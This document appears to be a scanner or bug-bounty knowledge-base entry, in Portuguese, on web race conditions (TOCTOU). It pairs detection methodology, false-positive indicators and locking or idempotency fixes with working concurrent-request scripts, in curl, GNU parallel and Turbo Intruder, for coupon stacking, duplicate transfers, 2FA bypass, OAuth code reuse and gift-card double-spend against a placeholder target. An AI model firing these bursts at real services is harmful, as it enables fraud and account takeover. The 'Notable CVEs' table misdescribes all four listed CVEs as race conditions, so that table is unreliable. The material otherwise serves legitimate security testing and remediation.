---
id: race_condition
title: "Race Condition"
module: "RaceCondition"
severity: "HIGH"
cwe_id: "CWE-362"
cwe_title: "Concurrent Execution Using Shared Resource with Improper Synchronization ('Race Condition')"
cvss_vector: "AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N"
vrt_id: "server_security_misconfiguration.race_condition"
---

## Summary
Requisicoes concorrentes a endpoints transacionais exploram janelas de TOCTOU (time-of-check-to-time-of-use) para duplicar acoes que deveriam ser unicas -- aplicar cupons, transferir fundos, votar, registrar contas ou resgatar vouchers multiplas vezes.

## Description
Race conditions em aplicacoes web ocorrem quando o servidor processa multiplas requisicoes simultaneas que compartilham estado mutavel sem sincronizacao adequada. O atacante envia um burst de requisicoes identicas no menor intervalo possivel, explorando a janela entre a verificacao de uma condicao (check) e sua aplicacao (use).

Variantes principais:

- **Success Duplication:** multiplas requisicoes a um endpoint transacional retornam 2xx com corpos diferentes -- indica que a acao foi executada mais de uma vez (ex.: cupom aplicado N vezes, transferencia duplicada).
- **Rate Limit Bypass:** requisicoes concorrentes ultrapassam o contador de rate limit porque o decremento nao e atomico -- o header `X-RateLimit-Remaining` mostra o mesmo valor em todas as respostas do burst.
- **State Inconsistency (TOCTOU):** respostas mistas de sucesso e conflito (200 + 409/429) indicam que algumas requisicoes passaram pela verificacao antes que outras acionassem a condicao de guarda.
- **Limit Overrun:** funcionalidades com limite unico (single-use invite, one-time password reset, single vote) executam multiplas vezes quando N requisicoes chegam antes do lock.

A deteccao e feita por analise diferencial: compara-se um baseline (requisicao unica) com um burst concorrente e procura-se divergencia de status codes, tamanho de resposta, headers de rate limit ou conteudo do body.

## Impact
- Duplicacao de transacoes financeiras (cupons, transferencias, compras).
- Bypass de rate limiting para brute force de credenciais ou OTP.
- Multiplos votos, likes, follows ou registros a partir de uma unica conta.
- Corrupcao de estado compartilhado (saldo, estoque, contadores).
- Bypass de restricoes single-use (convites, tokens de reset, vouchers).
- Escalada de privilegios via condicoes de corrida em fluxos de autorizacao.

## Payloads and Techniques
```bash
# Burst concorrente com curl -- 10 requisicoes simultaneas
for i in $(seq 1 10); do
  curl -s -o /dev/null -w '%{http_code}\n' -X POST 'https://alvo.com/api/redeem' \
    -H 'Authorization: Bearer TOKEN' \
    -H 'Content-Type: application/json' \
    -d '{"coupon":"DESCONTO50"}' &
done
wait

# Burst com GNU parallel (mais preciso)
seq 1 20 | parallel -j 20 'curl -s -o /dev/null -w "%{http_code}\n" -X POST https://alvo.com/api/transfer -H "Authorization: Bearer TOKEN" -d "amount=100&to=attacker"'

# Single-packet attack (HTTP/2) -- Turbo Intruder
# Envia N requisicoes em um unico pacote TCP para minimizar jitter
# Engine: concurrentConnections=1, requestsPerConnection=30, pipeline=True
# gate='race1' sincroniza o envio

# Turbo Intruder -- burst basico
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                        concurrentConnections=30,
                        requestsPerConnection=30,
                        pipeline=False)
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')
    engine.start(timeout=5)
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)

# Turbo Intruder -- 2 requisicoes (request chaining)
# Util quando a janela e de poucos milissegundos entre req1 e req2
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False)
    request1 = '''POST /api/apply-coupon HTTP/1.1
Host: alvo.com
Cookie: session=SESS_TOKEN
Content-Type: application/json

{"coupon":"DESCONTO50"}'''

    request2 = '''GET /api/cart HTTP/1.1
Host: alvo.com
Cookie: session=SESS_TOKEN'''

    engine.queue(request1, gate='race1')
    for i in range(30):
        engine.queue(request2, gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)

# Deteccao via rate limit header
# Enviar burst e comparar X-RateLimit-Remaining entre respostas
for i in $(seq 1 10); do
  curl -s -D - -o /dev/null 'https://alvo.com/api/login' \
    -d 'user=admin&pass=test' | grep -i 'x-ratelimit' &
done
wait

# -- 2FA bypass via race condition --
# Enviar burst de requisicoes com OTP correto junto com request de login
# Se o 2FA check e verify nao sao atomicos, uma das requisicoes passa
# H1: HackerOne #429298 (139 upvotes) -- bypass de 2FA via race
for i in $(seq 1 20); do
  curl -s -o /dev/null -w '%{http_code}\n' -X POST 'https://alvo.com/api/verify-2fa' \
    -H 'Cookie: session=PENDING_SESSION' \
    -d '{"otp":"123456"}' &
done
wait

# -- OAuth authorization code reuse via race --
# Interceptar code e enviar burst para /token com o mesmo code
# Se a invalidacao do code nao e atomica, multiplos access_tokens sao emitidos
for i in $(seq 1 10); do
  curl -s -o /dev/null -w '%{http_code}\n' -X POST 'https://alvo.com/oauth/token' \
    -d 'grant_type=authorization_code&code=AUTH_CODE&redirect_uri=REDIR&client_id=ID' &
done
wait

# -- Gift card / balance race --
# Burst de requisicoes de resgate do mesmo gift card / saldo
# H1: Reverb.com #429200 (308 upvotes, $2,500) -- gift card duplicate redemption
for i in $(seq 1 15); do
  curl -s -o /dev/null -w '%{http_code}\n' -X POST 'https://alvo.com/api/redeem-gift' \
    -H 'Authorization: Bearer TOKEN' \
    -d '{"card":"GIFT-CODE-123"}' &
done
wait
```

## Target Context (Crawler Hints)
- **Parametros comuns:** `coupon`, `code`, `voucher`, `amount`, `to`, `from`, `vote`, `action`, `qty`, `quantity`, `invite`, `token`, `otp`.
- **Paths comuns:** `/api/redeem`, `/api/transfer`, `/api/checkout`, `/api/payment`, `/api/coupon`, `/api/vote`, `/api/like`, `/api/follow`, `/api/subscribe`, `/api/register`, `/api/signup`, `/api/apply`, `/api/claim`, `/api/withdraw`, `/api/deposit`, `/api/order`, `/api/purchase`, `/api/submit`.
- **Sinais:** endpoints transacionais (payment, transfer, checkout, redeem, coupon, vote, like, follow, subscribe, register, signup, apply, claim, withdraw, deposit, order, purchase, submit); presenca de header `X-RateLimit-Remaining`; respostas 409 Conflict ou 429 Too Many Requests.

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2023-32784 | KeePass 2.x | 2023 | Race condition no dump de memoria permite extrair master password em cleartext do processo | Memory race |
| CVE-2022-29885 | Apache Tomcat | 2022 | Race condition no clustering permite bypass de autenticacao via sessao compartilhada | Auth bypass |
| CVE-2023-45866 | BlueZ (Linux Bluetooth) | 2023 | Race condition no pairing permite keystroke injection sem confirmacao do usuario | Input injection |
| CVE-2024-24576 | Rust std::process::Command (Windows) | 2024 | Race condition na resolucao de executaveis permite command injection via bat files | Command injection |

## Escalation Techniques
- **Coupon stacking:** aplicar o mesmo cupom N vezes em um unico checkout, obtendo desconto multiplicado ou produtos gratuitos.
- **Double spending:** enviar transferencias duplicadas antes que o saldo seja atualizado -- o saldo e verificado N vezes com o valor original.
- **Vote manipulation:** votar multiplas vezes em pesquisas, rankings ou sistemas de reputacao.
- **Account creation bypass:** registrar multiplas contas com o mesmo email/telefone quando a verificacao de unicidade nao e atomica.
- **OTP brute force via rate limit bypass:** enviar burst de tentativas de OTP que ultrapassam o rate limiter, aumentando drasticamente as chances de acerto.
- **Invite/referral abuse:** resgatar o mesmo convite ou codigo de referral multiplas vezes para obter creditos ou bonus duplicados.
- **2FA bypass via race:** enviar burst de requisicoes ao endpoint de verificacao 2FA com o OTP correto. Se a invalidacao do OTP e do check de tentativas nao sao atomicos, uma requisicao passa enquanto outra ainda esta na janela de verificacao. H1: HackerOne #429298 (139 upvotes, $10,000) -- bypass completo de 2FA.
- **OAuth code reuse race:** interceptar authorization code e enviar burst ao /token endpoint. Se a invalidacao do code nao e atomica, multiplos access_tokens sao emitidos a partir de um unico code. Permite persistent access apos o code "expirar".
- **Gift card / balance double-spend:** burst de resgate do mesmo gift card ou saldo de carteira. H1: Reverb.com #429200 (308 upvotes, $2,500) -- resgate duplicado de gift card. Cosmos #781350 ($5,000) -- faucet race no blockchain.
- **Persistent session via race:** enviar burst de requisicoes de login/sessao para criar multiplas sessoes validas simultaneas. Logout invalida apenas uma, as outras permanecem ativas. H1: HackerOne #300305 -- race no fluxo de retest criava multiplas sessoes.
- **Email/notification race:** burst de email change ou notification toggle -- se a verificacao de unicidade nao e atomica, o atacante registra o mesmo email em multiplas contas ou recebe notificacoes duplicadas. H1: InnoGames #365562 ($2,000).

## Hunting Methodology
1. Identificar endpoints transacionais via crawler -- buscar paths com keywords: payment, transfer, checkout, redeem, coupon, vote, like, follow, subscribe, register, signup, apply, claim, withdraw, deposit, order, purchase, submit.
2. Enviar requisicao baseline (unica) e registrar status code, tamanho do body e headers de rate limit.
3. Enviar burst concorrente (10-30 requisicoes identicas) no menor intervalo possivel (HTTP/2 single-packet ou curl com &).
4. Comparar respostas do burst com o baseline: status codes diferentes? Multiplos 2xx com bodies divergentes? Rate limit headers identicos em todas as respostas?
5. Se houver divergencia, repetir 3-5 vezes para confirmar consistencia -- variacoes por carga do servidor sao normais, mas race conditions reais sao reprodutiveis.
6. Para endpoints autenticados, usar o mesmo token/session em todas as requisicoes do burst.
7. Testar tambem variantes: request chaining (POST + GET imediato), HTTP/1.1 pipelining, e HTTP/2 multiplexing.

## False Positive Indicators
- Todas as respostas do burst tem status e body identicos ao baseline -- comportamento normal, sem race condition.
- Divergencia de tempo de resposta sem divergencia de conteudo -- variacao de carga do servidor, nao race condition.
- Rate limit headers decrementam corretamente em cada resposta do burst -- rate limiter funciona com contadores atomicos.
- Endpoint retorna 409 Conflict ou 429 Too Many Requests para todas as requisicoes do burst exceto a primeira -- locking funciona corretamente.
- Respostas 2xx duplicadas mas com conteudo identico (idempotencia) -- o servidor processa mas nao duplica o efeito colateral.
- Servidor usa idempotency key (header `Idempotency-Key` ou `X-Request-Id`) e retorna resultado cacheado para requisicoes duplicadas -- nao e race condition.
- Endpoint e read-only (GET) ou retorna dados sem side-effect -- divergencia de timing nao e exploravel.
- Burst retorna multiplos 2xx mas verificacao manual mostra que apenas uma transacao foi efetivada (database-level lock funcionou, response e cacheada/stale).

## Notable HackerOne Reports

| Report | Programa | Upvotes | Bounty | Tecnica |
|--------|----------|---------|--------|---------|
| #429200 | Reverb.com | 308 | $2,500 | Gift card double-spend via race condition |
| #429298 | HackerOne | 139 | $10,000 | 2FA bypass completo via race condition |
| #781350 | Cosmos | 120 | $5,000 | Faucet race no blockchain |
| #365562 | InnoGames | 90 | $2,000 | Email change race -- multiplas contas com mesmo email |
| #300305 | HackerOne | 75 | $0 | Race no fluxo de retest cria sessoes duplicadas |
| #55140 | IBB | 51 | $0 | OAuth authorization code reuse via race |
| #699112 | Razer | 40 | $250 | OAuth token race -- multiplos access_tokens |

## Recommendation
1. Implementar locks no banco de dados (SELECT ... FOR UPDATE, advisory locks) ou locks distribuidos (Redis SETNX, Redlock) em torno de operacoes check-then-act.
2. Usar transacoes com isolation level SERIALIZABLE para operacoes financeiras e transacionais criticas.
3. Implementar idempotency keys em APIs -- cada requisicao transacional carrega um UUID unico; requisicoes duplicadas retornam o resultado da primeira sem re-executar.
4. Usar contadores atomicos para rate limiting (Redis INCR, database UPDATE ... SET remaining = remaining - 1 WHERE remaining > 0).
5. Adicionar optimistic concurrency control com version columns (UPDATE ... WHERE version = N; se 0 rows affected, retry ou rejeitar).
6. Para funcionalidades single-use, marcar o recurso como usado atomicamente na mesma query que verifica disponibilidade.
7. Testar com burst concorrente em CI/CD para regressao.
